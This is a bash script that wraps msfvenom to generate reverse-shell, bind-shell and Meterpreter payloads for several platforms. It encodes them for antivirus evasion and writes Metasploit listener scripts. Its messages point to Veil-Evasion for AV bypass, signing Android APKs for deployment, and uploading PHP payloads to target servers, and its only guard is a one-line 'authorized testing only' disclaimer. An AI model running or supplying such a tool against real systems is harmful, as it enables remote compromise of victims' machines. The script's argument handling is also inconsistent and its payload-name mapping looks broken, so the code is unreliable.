#!/bin/bash

# Payload Generator (MSFVenom wrapper)
# Generate shellcode and payloads with presets, encoders, and format conversion
# Usage: ./payload_gen.sh <os> <format> <lhost> <lport> [options]
# Example: ./payload_gen.sh windows tcp_rev meterpreter 192.168.1.100 4444
# Requires: msfvenom, x86_toolkit (for encoding)
# Disclaimer: For authorized testing only

set -euo pipefail

OS="${1:-}"
PAYLOAD="${2:-tcp_rev}"
FORMAT="${3:-exe}"
LPORT="${4:-4444}"
LPATH="${5:-}"
OUTPUT_DIR="payloads_$(date +%Y-%m-%d)"
JSON_OUTPUT=false

RED='\033[0;31m' GREEN='\033[0;32m' YELLOW='\033[1;33m' BLUE='\033[0;34m' CYAN='\033[0;36m' NC='\033[0m'
log()   { echo -e "${BLUE}[$(date '+%Y-%m-%d %H:%M:%S')] $1${NC}"; }
warn()  { echo -e "${YELLOW}[-] $1${NC}"; }
found() { echo -e "${GREEN}[✓] $1${NC}"; }
fail()  { echo -e "${RED}[!] $1${NC}"; }

usage() {
    head -4 "$0" | cut -c4-
    echo ""
    echo "Usage:"
    echo "  $0 <os> <payload> <format> <lhost> <lport> [options]"
    echo ""
    echo "Arguments:"
    echo "  os        Target OS: windows, linux, mac, android, python, php, ruby, bash"
    echo "  payload   Payload type:"
    echo "             tcp_rev      — TCP reverse shell"
    echo "             tcp_bind     — TCP bind shell"
    echo "             https_rev    — HTTPS reverse shell"
    echo "             meterpreter  — Meterpreter reverse TCP"
    echo "             stage        — Staged meterpreter"
    echo "             stageless    — Stageless meterpreter"
    echo "  format    Output format: raw, exe, elf, macho, apk, war, jar, py, php,rb, sh"
    echo "  lhost     Local host (attacker IP)"
    echo "  lport     Local port (listener port)"
    echo ""
    echo "Options:"
    echo "  -e, --encoder ENCODER   Encoder: shikata_ga_nai, xor, alpha3, etc."
    echo "  -i, --iterations N      Encoder iterations (default: 1)"
    echo "  -o, --output DIR        Output directory"
    echo "  -p, --platform PLAT     Override platform"
    echo "  -n, --nops SIZE         NOP sled size"
    echo "  -b, --bad-chars CHARS   Bad characters to avoid (hex, e.g. \\x00\\x0a)"
    echo "  -j, --json              JSON output"
    echo "  -h, --help              Show this help"
    echo ""
    echo "Examples:"
    echo "  $0 windows tcp_rev exe 192.168.1.100 4444"
    echo "  $0 linux meterpreter elf 10.0.0.1 8080 -e xor -i 3"
    echo "  $0 python tcp_rev raw 10.10.10.5 443 -b \"\\x00\\x0a\\x0d\""
    echo "  $0 android tcp_rev apk 192.168.1.50 4444"
    exit 1
}

ENCODER=""
ITERATIONS=1
NOP_SIZE=0
BAD_CHARS=""
PLATFORM=""

while [[ $# -gt 0 ]]; do
    case "$1" in
        -e|--encoder) ENCODER="$2"; shift 2 ;;
        -i|--iterations) ITERATIONS="$2"; shift 2 ;;
        -o|--output) OUTPUT_DIR="$2"; shift 2 ;;
        -p|--platform) PLATFORM="$2"; shift 2 ;;
        -n|--nops) NOP_SIZE="$2"; shift 2 ;;
        -b|--bad-chars) BAD_CHARS="$2"; shift 2 ;;
        -j|--json) JSON_OUTPUT=true; shift ;;
        -h|--help) usage ;;
        *) shift ;;
    esac
done

# Re-parse required args if --help wasn't called
OS="${1:-}"
PAYLOAD="${2:-tcp_rev}"
FORMAT="${3:-exe}"
LPORT="${4:-4444}"

[[ -z "$OS" ]] && usage

mkdir -p "$OUTPUT_DIR"

# ─── Payload mappings ───
declare -A PAYLOAD_MAP=(
    ["tcp_rev"]="tcp/reverse"
    ["tcp_bind"]="tcp/bind"
    ["https_rev"]="https/reverse"
    ["meterpreter"]="windows/meterpreter/reverse_tcp"
    ["stage"]="windows/meterpreter/reverse_tcp_stage"
    ["stageless"]="windows/meterpreter_reverse_tcp"
)

# ─── Format to file extension ───
get_ext() {
    case "$1" in
        raw) echo "bin" ;;
        exe) echo "exe" ;;
        elf) echo "elf" ;;
        macho) echo "macho" ;;
        apk) echo "apk" ;;
        war) echo "war" ;;
        jar) echo "jar" ;;
        py) echo "py" ;;
        php) echo "php" ;;
        rb) echo "rb" ;;
        sh) echo "sh" ;;
        *) echo "$1" ;;
    esac
}

# ─── Resolve payload ───
resolve_payload() {
    local os="$1" local type="$2"
    local base="${PAYLOAD_MAP[$type]:-tcp/reverse}"

    case "$os" in
        windows) echo "windows/${base#tcp/}" ;;
        linux)   echo "linux/${base#tcp/}" ;;
        mac)     echo "osx/${base#tcp/}" ;;
        android) echo "android/${base#tcp/}" ;;
        python)  echo "python/${base#tcp/}" ;;
        php)     echo "php/${base#tcp/}" ;;
        ruby)    echo "cmd/unix/${base#tcp/}" ;;
        bash)    echo "cmd/unix/${base#tcp/}" ;;
        *)      echo "$base" ;;
    esac
}

FINAL_PAYLOAD=$(resolve_payload "$OS" "$PAYLOAD")
EXT=$(get_ext "$FORMAT")

OUTPUT_FILE="$OUTPUT_DIR/payload_${OS}_${LPORT}.$EXT"
ENCODED_FILE="$OUTPUT_DIR/payload_${OS}_${LPORT}_encoded.$EXT"
RAW_FILE="$OUTPUT_DIR/payload_${OS}_${LPORT}_raw.bin"
JSON_FILE="$OUTPUT_DIR/results.json"

log "Payload generation starting..."
log "  OS:       $OS"
log "  Payload:  $FINAL_PAYLOAD"
log "  Format:   $FORMAT"
log "  LHOST:    ${@:4:1}"
log "  LPORT:    $LPORT"
[[ -n "$ENCODER" ]] && log "  Encoder:  $ENCODER (iterations: $ITERATIONS)"
[[ -n "$BAD_CHARS" ]] && log "  Bad chars: $BAD_CHARS"

# ─── Build msfvenom command ───
MSFVENOM_BASE="msfvenom -p $FINAL_PAYLOAD"
[[ -n "${@:4:1}" ]] && MSFVENOM_BASE+=" LHOST=${@:4:1}"
MSFVENOM_BASE+=" LPORT=$LPORT"
MSFVENOM_BASE+=" -f $FORMAT"

# Add platform if specified
[[ -n "$PLATFORM" ]] && MSFVENOM_BASE+=" --platform $PLATFORM"

# Add bad chars
[[ -n "$BAD_CHARS" ]] && MSFVENOM_BASE+=" -b \"$BAD_CHARS\""

# Add nops
[[ "$NOP_SIZE" -gt 0 ]] && MSFVENOM_BASE+=" -n $NOP_SIZE"

# ─── Stage 1: Raw shellcode generation ───
log "Generating shellcode..."

if [[ -n "$ENCODER" && "$ITERATIONS" -gt 1 ]]; then
    # Multi-pass encoding
    shellcode=$(eval "$MSFVENOM_BASE -o \"$RAW_FILE\" 2>&1" || echo "FAILED")
    for ((i=1; i<=ITERATIONS; i++)); do
        log "  Encoding iteration $i/$ITERATIONS..."
        encoded=$(msfvenom -p "$FINAL_PAYLOAD" -e "$ENCODER" -i "$i" \
            LHOST="${@:4:1}" LPORT="$LPORT" \
            -f raw ${BAD_CHARS:+-b \"$BAD_CHARS\"} 2>/dev/null | base64 -w0 || echo "")
        [[ -n "$encoded" ]] && echo "$encoded" | base64 -d > "$ENCODED_FILE" || true
    done
else
    # Direct generation with optional encoder
    if [[ -n "$ENCODER" ]]; then
        log "  Using encoder: $ENCODER"
        shellcode=$(eval "$MSFVENOM_BASE -e $ENCODER -i $ITERATIONS -o \"$ENCODED_FILE\" 2>&1" || echo "FAILED")
        OUTPUT_FILE="$ENCODED_FILE"
    else
        shellcode=$(eval "$MSFVENOM_BASE -o \"$OUTPUT_FILE\" 2>&1" || echo "FAILED")
    fi
fi

# ─── Check output ───
if [[ ! -s "$OUTPUT_FILE" ]]; then
    fail "Payload generation failed: $shellcode"
    # Fallback: list available payloads
    warn "Available payloads for $OS:"
    msfvenom --list-payloads 2>/dev/null | grep "^    $OS/" | head -10
    exit 1
fi

SIZE=$(stat -c%s "$OUTPUT_FILE" 2>/dev/null || stat -f%z "$OUTPUT_FILE" 2>/dev/null || echo "unknown")
found "  Payload generated: $OUTPUT_FILE ($SIZE bytes)"

# ─── Generate listener resource script ───
HANDLER_FILE="$OUTPUT_DIR/listener_$OS.rc"
cat > "$HANDLER_FILE" <<EOF
# Metasploit handler resource script
# Auto-generated by payload_gen.sh
# Usage: msfconsole -r $HANDLER_FILE

use exploit/multi/handler
set PAYLOAD $FINAL_PAYLOAD
set LHOST ${@:4:1}
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF

found "  Handler script: $HANDLER_FILE"
log "  Run with: msfconsole -r $HANDLER_FILE"

# ─── Format-specific output ───
case "$FORMAT" in
    exe)
        # Generate stageless exe
        log "  EXE generated — may be flagged by AV"
        log "  Consider using Veil-Evasion for AV bypass"
        ;;
    apk)
        log "  APK generated — sign before deploying"
        log "  Use: jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $OUTPUT_FILE alias_name"
        ;;
    py)
        log "  Python payload generated — run with: python $OUTPUT_FILE"
        # Add shebang
        sed -i '1s|^|#!/usr/bin/env python\n|' "$OUTPUT_FILE" 2>/dev/null || true
        ;;
    php)
        log "  PHP payload generated"
        log "  Upload to target webserver and execute"
        ;;
    sh)
        log "  Shell script generated"
        chmod +x "$OUTPUT_FILE" 2>/dev/null || true
        ;;
esac

# ─── Generate hexdump for analysis ───
HEXDUMP_FILE="$OUTPUT_DIR/payload_${OS}_${LPORT}.hexdump.txt"
xxd -p "$OUTPUT_FILE" | tr -d '\n' > "$HEXDUMP_FILE" 2>/dev/null || true
found "  Hexdump: $HEXDUMP_FILE"

# ─── JSON output ───
if [[ "$JSON_OUTPUT" == "true" ]]; then
    cat > "$JSON_FILE" <<EOF
{
  "os": "$OS",
  "payload": "$FINAL_PAYLOAD",
  "format": "$FORMAT",
  "lhost": "${@:4:1}",
  "lport": $LPORT,
  "encoder": "${ENCODER:-none}",
  "iterations": $ITERATIONS,
  "bad_chars": "${BAD_CHARS:-none}",
  "output_file": "$OUTPUT_FILE",
  "output_size": $SIZE,
  "handler_script": "$HANDLER_FILE",
  "hexdump": "$HEXDUMP_FILE",
  "msfvenom_cmd": "msfvenom -p $FINAL_PAYLOAD LHOST=${@:4:1} LPORT=$LPORT -f $FORMAT",
  "timestamp": "$(date -I)"
}
EOF
fi

# ─── Summary ───
log "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
log "Payload Generation Complete"
echo -e "${GREEN}[✓]${NC} Payload:     $OUTPUT_FILE"
echo -e "${GREEN}[✓]${NC} Size:        $SIZE bytes"
echo -e "${GREEN}[✓]${NC} Format:      $FORMAT"
echo -e "${GREEN}[✓]${NC} Handler:    $HANDLER_FILE"
echo ""
echo -e "  Payload:   ${CYAN}$OUTPUT_FILE${NC}"
echo -e "  Hexdump:   ${CYAN}$HEXDUMP_FILE${NC}"
[[ "$ENCODER" ]] && echo -e "  Encoded:   ${YELLOW}$ENCODED_FILE${NC}"
echo ""
log "Start listener: msfconsole -r $HANDLER_FILE"
log "Generate complete — use only with authorization"